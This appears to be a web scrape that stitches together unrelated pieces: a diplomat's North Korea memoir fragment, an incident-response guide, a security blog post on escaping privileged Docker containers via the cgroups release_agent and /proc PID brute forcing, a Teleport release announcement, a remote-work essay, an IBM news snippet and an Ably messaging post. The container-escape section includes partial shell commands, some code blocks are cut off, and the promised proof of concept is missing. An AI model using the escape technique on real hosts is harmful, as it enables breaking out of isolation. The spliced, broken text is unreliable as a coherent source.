data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-4-1254"> North Korea</figcaption></figure></div><p>But surprisingly, no.</p><p>Against all expectations, they did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. This spot had been identified and human bones and fragments of uniform and aircraft were also uncovered. This scenario is somewhat similar to my previous post <a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p>This news then led over the next six months to a long series of meetings, usually weekly either at Army HQ in Pyongyang, the crash site or at a military base on the outskirts of the city chaired on the military side by Senior Colonel Kwak Chol-hui who was to be my main point of contact for this project. I am glad to report that the two shady civilians from our first meeting never did make a reappearance.</p><p>The Colonel who would later go on to be promoted to Major General was responsible throughout the negotiations for arranging visits to the site, meetings with the two surviving eyewitnesses and agreeing that Flt Lt Hinton’s brother would be fast tracked for a visa and allowed to visit the DPRK site to pay his final respects to his brother.</p><p>True to their word, Flt Lt Hinton’s brother was granted his visa and permitted to visit the village. At a meeting we had with the military, he was offered the choice of having his brother’s remains repatriated to the south via Panmunjon or re-buried on the outskirts of the village. He chose the latter. Therefore, the military re-buried his remains in a properly marked grave and on the final day of his visit, he was part of a small, brief ceremony attended by members of the British Embassy, North Korean military and villagers.</p><p>Despite my requests, the North Koreans had refused to allow me to obtain a properly inscribed headstone from the Commonwealth War Graves Commission, so a simple marker was used instead. Overall, it was a small victory but did give some form of closure to the family of Flt Lt Hinton.</p><p>As mentioned above, I met Colonel Kwak Chol-hui (pictured above with me at a Queens Birthday Party celebration in Pyongyang) and his team on many occasions over that 6 month period. As well as working on the Hinton project, he also eased the process of enabling me to take the very rare numbers of visitors we got down to the DMZ at Panmunjon as part of their “North Korean experience”. The other was the USS Pueblo where the military arranged private tours for me (Pueblo post to follow).</p><p>At Panmunjon, when I took visitors down to view the DMZ, we were always hosted by the military who would lay on briefings and guides for our visitors as well as a lunch afterwards. I could always see the look of bewilderment on the faces of the South Korean border guards and US military standing a few feet away on the southern side of the demarcation line wondering who these foreigners were on the other side looking a tad too cosy with North Korean officers!</p><p><b><i>*All of the above pre-supposes that this was the happy ending and finality for everyone involved. However, this was not to be the case as several years later a cruel deception was exposed, which I will be writing about shortly*</i></b></p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>

<h2>What is incident response?</h2>



<p>Incident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:</p>



<p>1- Preparation</p>



<p>2- Identification</p>



<p>3- Scope</p>



<p>4- Eradication</p>



<p>5- Recovery</p>



<p>6- Lessons Learned</p>



<p>If you want to practice about incident response, you can use our blue team training platform <a aria-label="undefined (opens in a new tab)" href="https://letsdefend.io/" target="_blank" rel="noreferrer noopener">LetsDefend </a>for free.</p>



<h3>1- Preparation</h3>



<p><strong>Creating a Central Registration System</strong></p>



<p>It is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.</p>



<p><strong>Time Synchronization</strong></p>



<p>Enabling NTP on all devices in the network is important for matching the time information of the logs collected.</p>



<p><strong>User Account Management</strong></p>



<p>The fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an event.</p>



<p><strong>Management of System and Service Accounts</strong></p>



<p>The administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.</p>



<p><strong>Asset Management</strong></p>



<p>Instant access to information such as devices, operating systems, patch versions, and critical status should be available.</p>



<p><strong>Secure Communication</strong></p>



<p>If necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.</p>



<p><strong>Legal Transactions</strong></p>



<p>The method of who will initiate the judicial process and in which situations should be determined before the incident occurs.</p>



<h3>2- Identification</h3>



<p><strong>Review</strong></p>



<p>For a potential suspicious incident, preliminary information about the incident should be gathered. Then it must be decided whether the situation is a suspicious event or not.</p>



<p><strong>Assignment</strong></p>



<p>The first person to examine the incident must be determined. The person should take notes about the review.</p>



<p><strong>Using the Checklist</strong></p>



<p>There should be checklists for the analysis to be made in order to ensure consistent responses to incidents.</p>



<h3>3- Scope</h3>



<p><strong>Characterize the event</strong></p>



<p>Since determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak …</p>



<p><strong>Taking Action</strong></p>



<p>Action should be taken according to the technique used to intercept the attacker’s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.</p>



<p><strong>Data collecting</strong></p>



<p>The image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.</p>



<p><strong>Isolation</strong></p>



<p>Unplugging the compromised system&nbsp; could be a solution, isolating it is a more viable solution.</p>



<p>After the systems affected by the incident are determined, the possibility of the attacker’s spread in the network is cut and volatile information is collected, the next step can be passed.</p>



<h3>4- Eradication</h3>



<p><strong>Identifying the Root Cause</strong></p>



<p>With the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely kick out.</p>



<p><strong>Determining Rootkit Potential</strong></p>



<p>If rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.</p>



<p><strong>Improve Defense</strong></p>



<p>Operating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.</p>



<p><strong>Vulnerability Scan</strong></p>



<p>Potential attack points on networks and systems should be identified and corrected by performing vulnerability scans.</p>



<p>When the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.</p>



<h3>5- Recovery</h3>



<p><strong>Verification</strong></p>



<p>Verify that logging, systems, applications, databases, and other operations work correctly.</p>



<p><strong>Restore</strong></p>



<p>At this stage, the restore operation is coordinated.</p>



<p><strong>Monitoring</strong></p>



<p>Systems should be monitored for recurring events.</p>



<p>When there is no repetitive harmful situation or unusual activity, the next step is taken.</p>



<h3>6- Lessons Learned</h3>



<p><strong>Writing a Follow-up Report</strong></p>



<p>The report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the event has been closed.</p>

<article itemscope="" itemtype="http://schema.org/BlogPosting">
  
  
  <div itemprop="articleBody">
    <p>I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by <a href="https://twitter.com/_fel1x">Felix Wilhelm (@_fel1x)</a> to escape a privileged container to execute arbitrary commands on the container host.</p>

<!--more-->



<p>Privileged containers are often used in CI/CD pipelines to allow for building and publishing Docker images. Compromising a privileged container gets you one step closer to accessing the container host, but often will not let you easily execute commands directly on the host.</p>

<p>In July 2019 howerver, Felix Wilhelm posted a Tweet with a Proof of Concept to escape a privileged container by abusing the Control Groups <code>release_agent</code> functionality to execute arbitrary commands on the container host:</p>

<blockquote data-dnt="true"><p lang="en" dir="ltr">Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature. <a href="https://t.co/q8BI8ASBO8">pic.twitter.com/q8BI8ASBO8</a></p>— Felix Wilhelm (@_fel1x) <a href="https://twitter.com/_fel1x/status/1151487053370187776?ref_src=twsrc%5Etfw">July 17, 2019</a></blockquote>


<p>Trail of Bits have done good job of explaining the details of this PoC at <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a>, they also detail the precise capabilities required for a container to execute this attack. A simple explanation is that the cgroups <code>release_agent</code> functionality can be triggered from a privileged container to execute a path on the host file system, specified by the contents of the <code>release_agent</code> file. The key is that the path specified in the <code>release_agent</code> file has to be relative to the root file system of the container host, <em>not</em> a container.</p>

<p>Felix’s PoC identifies the host path of files within a container by parsing the container root mount point, and extracting the <code>upperdir</code> mount option. To demonstrate this we can spin up a privileged Docker container and extract the host file system path of a file within the container:</p>

<div>


<figure><pre><code data-lang="sh">root@host:~<span>$ </span>docker run <span>-ti</span> <span>--privileged</span> <span>--rm</span> alpine:latest /bin/sh</code></pre></figure>

</div>

<p>Then within the container:</p>

<div>


<figure><pre><code data-lang="sh">root@container:~<span>$ </span><span>head</span> <span>-1</span> /etc/mtab

</div>

<p>In this instance the container is configured to use <code>overlayfs</code>, which exposes the host file system path of container mounts to the container itself. The host file system path here would be <code>/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff</code></p>

<p>This can be confirmed by creating a file within a container:</p>

<div>


<figure><pre><code data-lang="sh">root@container:~<span>$ </span><span>echo </span>findme <span>&gt;</span> /findme
root@container:~<span>$ </span><span>sed</span> <span>-n</span> <span>'s/.*\perdir=\([^,]*\).*/\1\/findme/p'</span> /etc/mtab
/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff/findme</code></pre></figure>

</div>

<p>And in another shell on the container host, using the <code>overlayfs</code> mount path to <code>cat</code> the file:</p>
<div>


<figure><pre><code data-lang="sh">root@host:~<span>$ </span><span>cat</span> /var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff/findme
findme</code></pre></figure>

</div>

<h2 id="edge-cases">Edge cases</h2>

<p>This works fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example <code>overlayfs</code>, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.</p>

</div>

<p><a href="https://katacontainers.io/">Kata Containers</a> by default mounts the root fs of a container over <code>9pfs</code>. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.</p>

</div>

<p>I saw a container with this root mount in a live environment, I believe the container was running with a specific <code>devicemapper</code> storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.</p>

<h2 id="an-alternative-poc">An Alternative PoC</h2>

<p>Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.</p>

<p>The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.</p>

<h3 id="proc-to-the-rescue">Proc to the Rescue</h3>

<p>The Linux <code>/proc</code> pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the <code>/proc</code> directory of the process on the host:</p>

<div>


<figure><pre><code data-lang="sh">root@container:~<span>$ </span><span>sleep </span>100</code></pre></figure>

...</code></pre></figure>

</div>

<p><em>As an aside, the <code>/proc/&lt;pid&gt;/root</code> data structure is one that confused me for a very long time, I could never understand why having a symbolic link to <code>/</code> was useful, until I read the actual definition in the man pages:</em></p>
<blockquote>
  <p>/proc/[pid]/root</p>

  <p>UNIX  and  Linux  support the idea of a per-process root of the filesystem, set by the chroot(2) system call.  This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/*.</p>

  <p>Note however that this file is not merely a symbolic link.  It provides the same view of the filesystem (including namespaces and the set  of  per-process mounts)  as the process itself.</p>
</blockquote>

<p>The <code>/proc/&lt;pid&gt;/root</code> symbolic link can be used as a host relative path to any file within a container:</p>

<div>


<figure><pre><code data-lang="sh">root@container:~<span>$ </span><span>echo </span>findme <span>&gt;</span> /findme
root@container:~<span>$ </span><span>sleep </span>100</code></pre></figure>

</div>

<div>


<figure><pre><code data-lang="sh">root@host:~<span>$ </span><span>cat</span> /proc/<span>`</span>pidof <span>sleep</span><span>`</span>/root/findme
findme</code></pre></figure>

</div>

<p>This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of <em>any</em> process running in the container.</p>

<h3 id="pid-bashing">Pid Bashing</h3>

<p>This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The <code>init</code> process is assigned process id <code>1</code> and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:</p>

<div>


<figure><pre><code data-lang="sh">root@container:~<span>$ </span><span>echo </span>findme <span>&gt;</span> /findme
root@container:~<span>$ </span><span>sleep </span>100</code></pre></figure>

</div>

<div>

7822
root@host:~<span>$ </span><span>cat</span> /proc/<span>${</span><span>COUNTER</span><span>}</span>/root/findme
findme</code></pre></figure>

</div>

<h3 id="putting-it-all-together">Putting it All Together</h3>

<p>To complete this attack the brute force technique can be used to guess the pid for the path <code>/proc/&lt;pid&gt;/root/payload.sh</code>, with each iteration writing the guessed pid path to the cgroups <code>release_agent</code> file, triggering the <code>release_agent</code>, and seeing if an output file is created.</p>

<p>The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this <em>should</em> not cause reliability issues, but don’t quote me on that.</p>

<p>The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups <code>release_agent</code>  functionality:</p>

<h2 id="introduction">Introduction</h2>

<p>Today, we are announcing the availability of Teleport 5.0. This is a major release for the project with numerous improvements and new features, but the hallmark capability of this version is the <a href="https://goteleport.com/teleport/">Unified Access Plane</a> and <a href="https://goteleport.com/teleport/application/">Application Access</a> for Developers.</p>

<p>For those unfamiliar with Teleport, it is an open source project for giving developers secure remote access to everything they need. It started as a replacement for OpenSSH, then added Kubernetes access, and today we’re adding HTTPS as another protocol.</p>

<h2 id="application-access-for-developers">Application Access for Developers</h2>

<p>Do you have internal dashboards running inside your production or staging environments? Perhaps a couple of Jenkins servers, maybe a Kubernetes web UI, or other tools accessible via a browser? The old school method of accessing them was setting up a VPN, with extra points for configuring each of those apps to authenticate via some sort of a directory.</p>

<p>A better method is to embrace the <a href="https://goteleport.com/blog/vpns-and-zero-trust-thoughts-on-the-evolving-nature-of-remote-access/">Zero Trust</a> principle and expose all of your internal application endpoints to the internet with proper identity-based authentication with MFA. This creates work: getting a public IP, configuring DNS, maintaining X.509 certificates, setting up SAML integrations, etc. Just maintaining the inventory of all available HTTPS endpoints is work. Setting this up to qualify a SOC2, PCI or FedRAMP compliance is also work, and keeping your setup this way is a tiny bit of extra never-ending work.</p>

<p>This isn’t rocket science, but we believe it must not be something that you should be spending your time on. Besides, if the operational costs of securely exposing another internal tool to the team was zero, we would all enjoy more tools.</p>

<p>Consider another use case: a web application running behind NAT on a third party network. To make it entertaining, think of a web app running on a self-driving vehicle with an ever-changing IP address. If you ship devices with web dashboards to be deployed inside customer networks, how do you access them from the outside?</p>

<p>This is why we’ve added Application Access to Teleport 5.0. It allows users to visit the Teleport proxy in a browser and see a live inventory of applications running anywhere in the world. Each web application is just an HTTPS URL provided by Teleport, so you can have:</p>

<ul>
<li><a href="https://jenkins.proxy.example.com/">https://jenkins.proxy.example.com</a></li>
<li><a href="https://grafana.proxy.example.com/">https://grafana.proxy.example.com</a></li>
<li><a href="https://your-own-app.example.com/">https://your-own-app.example.com</a></li>
</ul>

<p>…and more. An application can be added or removed with just a couple of clicks. It can even be completely automated. Here’s how it looks in the Web UI:

<h2 id="how-does-application-access-work">How does Application Access Work?</h2>

<p>Teleport, for those who have never used it, is a single dependency-free binary which can run as a Linux daemon or can be deployed as a Kubernetes pod. Not surprisingly, this binary is called <code>teleport</code>.</p>

<p><code>teleport</code> behaves differently based on the command-line arguments or via a configuration file. It can run in several modes, also called roles. Combining them together allows you to tailor Teleport deployment to your needs:</p>

<ul>
<li><em>Proxy service</em>, if started as <code>teleport start --roles=proxy</code></li>
<li><em>An application access service,</em> if started as <code>teleport start --roles=app</code> (shown as “sidecar” on the diagram)</li>
</ul>

<p>Here’s an example of how these services can work together to give developers seamless access to internal web apps with a single login:</p>

<p><img width="60%" src="https://goteleport.com/blog/images/2020/application-access-announcement-2.png" alt="how a proxy service and application access service work together"></p>

<p>Let’s consider how connectivity is established first, and then we’ll cover authentication.</p>

<h3 id="connectivity">Connectivity</h3>

<p>The diagram above is self-explanatory:</p>

<ul>
<li>A Teleport Proxy service must be running somewhere and exposed to the public internet. The proxy is the single access point that can be used to access applications anywhere. The proxy is not a single point of failure as you can have several copies behind a network load-balancer or via a DNS split.</li>
<li>Each private network needs to run a copy of <code>teleport</code> running with <code>--roles=app</code>. This process is a sidecar, which creates an encrypted outbound tunnel to the Teleport proxy. The tunnel is permanent, and if the proxy becomes unavailable, or if the Internet connectivity is not reliable, the sidecar will be trying to reconnect when possible.</li>
<li>Each app gets a DNS name issued by the proxy, so if the proxy is running on <code>proxy.example.com</code>, you may have Jenkins available as <code>jenkins.proxy.example.com</code>. This DNS name also points at the proxy.</li>
<li>When a user tries to access <code>jenkins.proxy.example.com</code>, their request will be proxied through the suitable tunnel to the sidecar responsible for this app, and from there a connection to the actual Jenkins instance will be made.</li>
</ul>

<p>This architecture is fairly flexible, as it allows users to have sidecars running inside their networks, proxying access to all applications on that network. They can also be bundled with applications (inside the same Kubernetes pod, for example), so the apps can be configured to only listen on <code>localhost</code>. This guarantees that the only way to access an application is via the Teleport proxy.</p>

<h3 id="authentication">Authentication</h3>

<p>Obviously, the proxy is protected. Teleport supports multiple authentication methods:</p>

<ul>
<li><em>The local database of users with MFA</em>. This is suitable for quick experimentation and as a “Plan B” when other methods are not available.</li>
<li><em>Popular public identity providers</em> such as Github and Google, so you can configure the proxy to trust a certain Github team or a Google Apps group.</li>
<li><em>Corporate SSO</em> logins via SAML. Examples include Active Directory, Okta, Auth0, OneLogin, and so on.</li>
</ul>

<p>The identity of users is passed to applications via HTTP headers. If an application is capable of understanding this information, it will not present its own login screen. But even if an application is not built to understand such headers, users will have to login again using in-app authentication. It’s worth noting that Teleport proxy, when integrated with SSO, usually bothers users with a login just once per day, and most legacy apps offer “remember me” functionality, so the double-login for most use cases is not an issue.</p>

<h2 id="who-is-application-access-for">Who is Application Access for?</h2>

<p>Teleport Application access is naturally a great capability boost for existing Teleport users, who’re using it to get instant SSH to their environments. As a developer, a single login once per day should give you auto-expiring credentials for everything you need to be productive, be it a Jenkins instance, or Kubernetes clusters, or SSH nodes.</p>

<p>Teleport Application Access gives security professionals easy access controls to internal apps, so achieving FedRAMP compliance even for legacy internal applications becomes quite easy.</p>

<p>But even as a hobbyist, I have been enjoying having access to my Synology home NAS or to my printer’s web UI on the go!</p>

<h2 id="other-improvements">Other Improvements</h2>

<p>Teleport 5.0 comes with improved Kubernetes Access. In addition to connecting SSH nodes to a Teleport cluster, users can now configure Teleport to provide access to multiple Kubernetes clusters running behind NAT. This brings all three types of access to an equal footing:</p>

<ul>
<li>SSH Access</li>
<li>Application Access</li>
<li>Kubernetes Access</li>
</ul>

<p>The end result is an engineer getting access to all three with a single login.</p>

<h2 id="the-future-of-teleport">The Future of Teleport</h2>

<p>Traditionally, open source projects of similar architecture were called “proxies,” or simply “servers”, as in SSH server. Such a description never felt right for Teleport because its mission is to provide instant <em>access for engineers to any computing resource anywhere in the world</em>. Calling it a server or a proxy did not feel right, as its purpose was to remove machine and network boundaries and create an illusion of all computing resources being in the same “room” as an engineer.</p>

<p>Starting with version 5.0, Teleport will be known as a <strong>Unified Access Plane</strong>. Greg Chase, who runs our Product Marketing function, coined the term. It fits perfectly with our vision of erasing access boundaries between computing resources and environments.</p>

<p>The cloud has largely replaced the notion of a “computer” for most developers, as we create programs to run “in the cloud” now. The cloud is a collection of geographically scattered production environments, each consisting of ever-growing in height tech stacks. It is, essentially, a single-purpose, custom “computer” that we build from virtual parts supplied by the cloud providers. This computer currently lacks an operating system or standardization of any kind and we’re still stitching together solutions from good ole days to run our stuff on it, including remote access solutions. The list of “computer components” is long and each component currently comes with its own remote access facility: SSH, RDP, K8s API, databases, internal dashboards, etc. Ending this fragmentation is what Teleport is about.</p>

<blockquote>
<p>Teleport Unified Access plane’s purpose is to be a single remote access to this “cloud computer”, for all environments and all protocols.</p>
</blockquote>

<p>If you’ll be <a href="https://goteleport.com/get-started/">downloading Teleport</a> for the first time today, I figured you should be aware that you’re trying something new and truly special, and you should be aware that support for other protocols is in the works, with some just around the corner.</p>

<p>Also, consider subscribing to our newsletter below. We make a good effort to make it interesting for engineers, which is easy because we are in the middle of a massive shift in remote access technology.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As a junior at Northwestern University, the thought of building my career post-graduation in the midst of COVID-19 pandemic seemed daunting enough, let alone tackling it all remotely. At first, I felt overwhelmed, how was I supposed to pinpoint my professional interests, let alone find a job in that field, if I was barely able to leave my apartment? However, I quickly realized that I just needed to flip the script: If I didn’t have to limit myself to the jobs within a commutable distance, I could have an infinite number of opportunities in front of me. </p><p>Luckily, embracing this new mindset led me to my current role as a Business Analyst at Hyperinbox, an opportunity only made possible by remote work: two out of three co-founders are based in South Korea. Luckily for me, <a href="https://www.hyperinbox.app/">Hyperinbox</a> was founded as a remote work environment, so the team already had a great infrastructure in place to succeed. Regardless, starting a new position while working remotely had its ups and downs: Here are some of the challenges I faced and the ways I was quickly able to overcome them.&nbsp;</p><h3><strong>1. Familiarizing myself with the cadence and tools of the company</strong></h3><p><strong>	</strong>During my orientation, I was introduced to four different team-communication tools. Each of these serves a unique purpose, however, at first glance, I was unable to properly differentiate between some of them. I found myself constantly checking each platform for notifications, yet still fell behind in terms of updating my progress, as well as communicating correctly. I spent a significant amount of time getting used to the tools, mostly by playing around with them; however, I still felt as though many usages could be left up to personal interpretation.&nbsp;</p><p>It took me a few rounds of trial and error, but I paid attention to the comments and conversations my colleagues were having on different streams and began to pick up on their definitions and usages. I was quickly able to adapt and found myself learning a lot about the new applications and general features I had not previously appreciated or been aware of. This experience, however, was the first time I noticed the need for a centralized location for all my notifications –– I wanted to be able to both stay up to date on all forms of communication and also benefit from the different applications and their unique workstreams.&nbsp;</p><h3><strong>2. Maintaining a work-life balance while remote&nbsp;</strong></h3><p>	As I have mentioned, the beauty of entering the workforce while remote is the opportunity to work with people all around the world. However, all the resources in the world can’t change time zones. As a student, my class schedule is spread out throughout the day and does not lend itself to typical working hours. So, despite prioritizing my assignments effectively, I still felt the need to be “checked in”, even when off the clock. I was still feeling the effects of previously being conditioned to jump whenever a notification came through. Much of this was due to the demands of real-time communication, which is not always effective when working remotely.&nbsp;</p><p>I began to fully lean into the asynchronous work model adopted by Hyperinbox, and it led to a great change in my productivity. While I spent fewer hours at my desk, I got more done, because my time was focused and productive rather than spent waiting around for a response. Working around the quick “tap on the shoulder” problems and organizing my projects into mini sprints helped me not only get more done but also pushed me to stand on my own two feet and learn by doing. The asynchronous model has definitely proven to be effective, as long as you are able to organize all workstreams effectively, and I believe can lead to more creativity and progress when working with teams either across the country or around the world.&nbsp;<br></p><h3><strong>3. Not Missing a Beat</strong></h3><p>One of my first priorities when starting my new role was to establish myself as a good employee, especially while remote. Without face to face contact, I had imagined that my experience would be solely judged based on the simple record of my completion of tasks. I wanted to ensure that I was not missing anything, as I was under the impression that it would make or break my performance if I did due to the remote conditions. This past summer I worked at another company that had an in-person office, and at first, it was easier to catch on as I just had to look around to see what others were doing. However, as I began working remotely, these worries quickly subsided. I realized that despite being remote, working on a team was still teamwork: I was quickly able to get to know my teammates outside of just the person who assigned me tasks or reviewed my progress.&nbsp;</p><p>While Hyperinbox’s culture has an emphasis on cultivating workplace relationships, I also had to ensure that I was proactive, and leaning into these efforts was essential in making progress. While I tried a few different tactics, the experience exposed me to the new realities of working in a remote world. I could see first hand the value of the product I was now working on, and quickly transitioned to using the Hyperinbox application once up and running.&nbsp;</p><p>&nbsp;I soon settled in and I began to appreciate the attention to detail working remotely offers. The extra emphasis on organization and ensuring that all responsibilities are clearly defined allowed me to focus on <a href="https://www.calnewport.com/books/deep-work/">deep work</a> rather than stress over certain miscommunications that I sometimes found myself in while working in-person. I was able to spend more focused time working and relying on my own problem-solving skills when tackling projects, making me not only a better employee but also a more efficient communicator.&nbsp;</p><p>Overall, the remote experience has been a great one. While daunting to begin with, once I was able to take the time to familiarize myself with the environment and find customized solutions that were tailored to remote working rather than trying to recreate the in-person experience online, I felt confident in my work. We’re building Hyperinbox for those who struggle to make remote work actually work, like I was!

IBM is poised to cut 8,000 jobs across its European operations next year, including up to 2,000 jobs in its UK and Ireland business, a source close to the matter has told CPI. Cuts in IBM France and IBM Italy are also expected to be announced to the regional country HQs. Channel Partner Insight reported last month that IBM had already informed IBM Germany of its intentions to cut around 2,300 jobs in that market.

<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png"></figure><h2 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h2>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Let’s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>It’s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesn’t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, let’s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. It’s also the hardest to achieve.</li>
</ul>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery."><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, there’s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failures—specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
